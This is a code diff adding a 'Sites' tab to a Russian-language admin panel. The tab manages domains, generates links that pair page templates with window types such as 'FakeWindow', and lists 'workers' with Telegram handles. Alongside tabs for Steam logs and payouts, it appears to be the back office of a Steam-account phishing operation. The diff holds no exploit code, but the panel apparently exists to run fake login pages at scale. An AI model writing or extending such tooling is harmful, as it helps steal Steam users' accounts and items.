@@ -11,6 +11,7 @@
     stats: "Статистика",
     apps: "Заявки",
     economy: "Экономика",
+    sites: "Сайты",
     payouts: "Выплаты",
     steam: "Логи Steam",
     botlogs: "Логи бота",
@@ -93,6 +94,7 @@
       else if (viewId === "users") await renderUsers();
       else if (viewId === "stats") await renderStats();
       else if (viewId === "economy") await renderEconomy();
+      else if (viewId === "sites") await renderSites();
       else if (viewId === "apps") await renderApps();
       else if (viewId === "comms") await renderComms();
       else if (viewId === "payouts") await renderPayouts();
@@ -732,6 +734,265 @@ MAC-10 | Neon Rider (Factory New)</textarea>
     if (!(data.payouts || []).length) {
       body.innerHTML = `<tr><td colspan="6" class="muted">Очередь пуста</td></tr>`;
     }
+  }
+
+  async function renderSites() {
+    let sitesTab = "domains";
+    let selectedDomainId = null;
+
+    main.innerHTML = `
+      <div class="greeting">
+        <div>
+          <h1 class="greeting-title">Сайты</h1>
+          <p class="greeting-sub" id="sitesSub">Панель доменов и воркеров uproject</p>
+        </div>
+        <div class="period-pills" id="sitesTabs">
+          <button type="button" class="period-pill is-active" data-sites-tab="domains">Домены</button>
+          <button type="button" class="period-pill" data-sites-tab="workers">Воркеры</button>
+        </div>
+      </div>
+      <div id="sitesBody"></div>
+    `;
+
+    const body = document.getElementById("sitesBody");
+    const sub = document.getElementById("sitesSub");
+
+    document.getElementById("sitesTabs").addEventListener("click", (e) => {
+      const btn = e.target.closest("[data-sites-tab]");
+      if (!btn) return;
+      sitesTab = btn.dataset.sitesTab;
+      selectedDomainId = null;
+      document.querySelectorAll("#sitesTabs .period-pill").forEach((el) => {
+        el.classList.toggle("is-active", el.dataset.sitesTab === sitesTab);
+      });
+      load();
+    });
+
+    async function load() {
+      body.innerHTML = `<div class="panel-card"><div class="panel-card-body"><div class="muted">Загрузка…</div></div></div>`;
+      try {
+        if (sitesTab === "workers") await renderWorkers();
+        else if (selectedDomainId) await renderDomainDetail(selectedDomainId);
+        else await renderDomains();
+      } catch (e) {
+        body.innerHTML = `
+          <div class="panel-card">
+            <div class="panel-card-body">
+              <div class="empty">
+                <div class="empty-title">Не удалось открыть сайты</div>
+                <div class="empty-sub">${escapeHtml(e.message)}</div>
+                <p class="muted" style="margin:12px 0 0">Нужен аккаунт панели сайтов у текущего админа (создайте в карточке участника).</p>
+              </div>
+            </div>
+          </div>`;
+      }
+    }
+
+    async function renderDomains() {
+      const data = await PanelAPI.get("/admin/sites/domains");
+      sub.textContent = `Аккаунт: ${data.panelUsername || "—"} · доменов ${data.domains?.length || 0} · онлайн ${data.totalOnline || 0}`;
+      body.innerHTML = `
+        <div class="panel-card">
+          <div class="panel-card-body" style="padding-top:16px">
+            <div class="search-row">
+              <input class="search-input" id="siteDomainInput" placeholder="новый-домен.com" />
+              <button type="button" class="btn-ghost" id="siteDomainCheck">Проверить</button>
+              <button type="button" class="btn-primary" id="siteDomainAdd">Добавить</button>
+            </div>
+            <div class="muted" id="siteDomainHint" style="margin-bottom:12px"></div>
+            <div class="table-wrap">
+              <table class="data">
+                <thead>
+                  <tr><th>Домен</th><th>Онлайн</th><th>Тип</th><th>ID</th></tr>
+                </thead>
+                <tbody id="sitesDomainsBody"></tbody>
+              </table>
+            </div>
+          </div>
+        </div>
+      `;
+      const tbody = document.getElementById("sitesDomainsBody");
+      (data.domains || []).forEach((d) => {
+        const tr = document.createElement("tr");
+        tr.className = "clickable-row";
+        tr.innerHTML = `
+          <td>${escapeHtml(d.domain)}</td>
+          <td>${d.online}</td>
+          <td class="muted">${d.isOwn ? "свой" : d.isTeamPublic ? "командный" : "—"}</td>
+          <td class="muted">${d.id}</td>
+        `;
+        tr.addEventListener("click", () => {
+          selectedDomainId = d.id;
+          load();
+        });
+        tbody.appendChild(tr);
+      });
+      if (!(data.domains || []).length) {
+        tbody.innerHTML = `<tr><td colspan="4" class="muted">Доменов пока нет</td></tr>`;
+      }
+
+      const hint = document.getElementById("siteDomainHint");
+      document.getElementById("siteDomainCheck").addEventListener("click", async () => {
+        try {
+          const domain = document.getElementById("siteDomainInput").value.trim();
+          const preview = await PanelAPI.post("/admin/sites/domains/check", { domain });
+          hint.textContent = `Свободен. A-запись → ${preview.ip || "—"}`;
+          toast("Домен свободен");
+        } catch (e) {
+          hint.textContent = e.message;
+          toast(e.message, "error");
+        }
+      });
+      document.getElementById("siteDomainAdd").addEventListener("click", async () => {
+        try {
+          const domain = document.getElementById("siteDomainInput").value.trim();
+          const result = await PanelAPI.post("/admin/sites/domains", { domain });
+          toast(`Добавлен ${result.created?.domain || domain}`);
+          selectedDomainId = result.created?.id || null;
+          await load();
+        } catch (e) {
+          toast(e.message, "error");
+        }
+      });
+    }
+
+    async function renderDomainDetail(domainId) {
+      const [detail, templatesData] = await Promise.all([
+        PanelAPI.get(`/admin/sites/domains/${domainId}`),
+        PanelAPI.get("/admin/sites/templates").catch(() => ({ templates: [] })),
+      ]);
+      const d = detail.domain;
+      sub.textContent = d.domain;
+      const templates = templatesData.templates || [];
+      body.innerHTML = `
+        <div class="panel-card">
+          <div class="panel-card-head">
+            <h2 class="panel-card-title">${escapeHtml(d.domain)}</h2>
+            <button type="button" class="panel-card-link" id="sitesBack">← К списку</button>
+          </div>
+          <div class="panel-card-body">
+            <div class="meta-grid" style="margin-bottom:16px">
+              <div><dt>ID</dt><dd>${d.id}</dd></div>
+              <div><dt>Онлайн</dt><dd>${d.online}</dd></div>
+              <div><dt>Тип</dt><dd>${d.isOwn ? "свой" : "командный"}</dd></div>
+              <div><dt>IP</dt><dd>${escapeHtml(d.ip || "—")}</dd></div>
+            </div>
+            <div class="settings-row-title" style="margin-bottom:8px">Создать ссылку</div>
+            <div class="search-row">
+              <input class="search-input" id="siteLinkPath" placeholder="path (пусто = random)" />
+              <select class="search-input" id="siteLinkTemplate" style="max-width:220px">
+                <option value="">Шаблон…</option>
+                ${templates
+                  .map((t) => `<option value="${t.id}">${escapeHtml(t.name)}</option>`)
+                  .join("")}
+              </select>
+              <select class="search-input" id="siteLinkWindow" style="max-width:160px">
+                <option value="FakeWindow">FakeWindow</option>
+                <option value="CurrentWindow">CurrentWindow</option>
+                <option value="NewWindow">NewWindow</option>
+                <option value="AboutBlank">AboutBlank</option>
+              </select>
+              <button type="button" class="btn-primary" id="siteLinkCreate">Создать</button>
+            </div>
+            <div class="table-wrap" style="margin-top:8px">
+              <table class="data">
+                <thead><tr><th>Path</th><th>Окно</th><th>Шаблон</th><th>ID</th></tr></thead>
+                <tbody id="siteLinksBody"></tbody>
+              </table>
+            </div>
+            ${
+              d.isOwn
+                ? `<div class="drawer-actions" style="margin-top:16px"><button type="button" class="btn-ghost btn-danger" id="siteDomainDelete">Удалить домен</button></div>`
+                : ""
+            }
+          </div>
+        </div>
+      `;
+      const linksBody = document.getElementById("siteLinksBody");
+      (detail.links || []).forEach((link) => {
+        const tr = document.createElement("tr");
+        tr.innerHTML = `
+          <td>/${escapeHtml(link.path || "")}</td>
+          <td class="muted">${escapeHtml(link.windowType || "—")}</td>
+          <td class="muted">${escapeHtml(link.templateName || link.template || "—")}</td>
+          <td class="muted">${link.id ?? "—"}</td>
+        `;
+        linksBody.appendChild(tr);
+      });
+      if (!(detail.links || []).length) {
+        linksBody.innerHTML = `<tr><td colspan="4" class="muted">Ссылок нет</td></tr>`;
+      }
+
+      document.getElementById("sitesBack").addEventListener("click", () => {
+        selectedDomainId = null;
+        load();
+      });
+      document.getElementById("siteLinkCreate").addEventListener("click", async () => {
+        try {
+          await PanelAPI.post(`/admin/sites/domains/${domainId}/links`, {
+            path: document.getElementById("siteLinkPath").value.trim(),
+            templateId: document.getElementById("siteLinkTemplate").value,
+            windowType: document.getElementById("siteLinkWindow").value,
+          });
+          toast("Ссылка создана");
+          await renderDomainDetail(domainId);
+        } catch (e) {
+          toast(e.message, "error");
+        }
+      });
+      document.getElementById("siteDomainDelete")?.addEventListener("click", async () => {
+        if (!confirm(`Удалить домен ${d.domain}?`)) return;
+        try {
+          await PanelAPI.del(`/admin/sites/domains/${domainId}`);
+          toast("Домен удалён");
+          selectedDomainId = null;
+          await load();
+        } catch (e) {
+          toast(e.message, "error");
+        }
+      });
+    }
+
+    async function renderWorkers() {
+      const data = await PanelAPI.get("/admin/sites/workers");
+      sub.textContent = `Воркеры uproject · ${data.workers?.length || 0}`;
+      body.innerHTML = `
+        <div class="panel-card">
+          <div class="panel-card-body" style="padding-top:16px">
+            <div class="table-wrap">
+              <table class="data">
+                <thead><tr><th>Логин</th><th>Telegram</th><th>ID</th><th></th></tr></thead>
+                <tbody id="siteWorkersBody"></tbody>
+              </table>
+            </div>
+          </div>
+        </div>
+      `;
+      const tbody = document.getElementById("siteWorkersBody");
+      (data.workers || []).forEach((w) => {
+        const tr = document.createElement("tr");
+        tr.innerHTML = `
+          <td>${escapeHtml(w.username || "—")}${w.isOwner ? ' <span class="badge ok">вы</span>' : ""}</td>
+          <td class="muted">${escapeHtml(w.telegram || "—")}</td>
+          <td class="muted">${w.id ?? "—"}</td>
+          <td></td>
+        `;
+        if (w.telegram) {
+          const btn = document.createElement("button");
+          btn.type = "button";
+          btn.className = "btn-ghost";
+          btn.textContent = "Юзер";
+          btn.addEventListener("click", () => openMember(String(w.telegram)));
+          tr.lastElementChild.appendChild(btn);
+        }
+        tbody.appendChild(tr);
+      });
+      if (!(data.workers || []).length) {
+        tbody.innerHTML = `<tr><td colspan="4" class="muted">Пусто</td></tr>`;
+      }
+    }
+
+    await load();
   }
 
   async function renderSteam() {
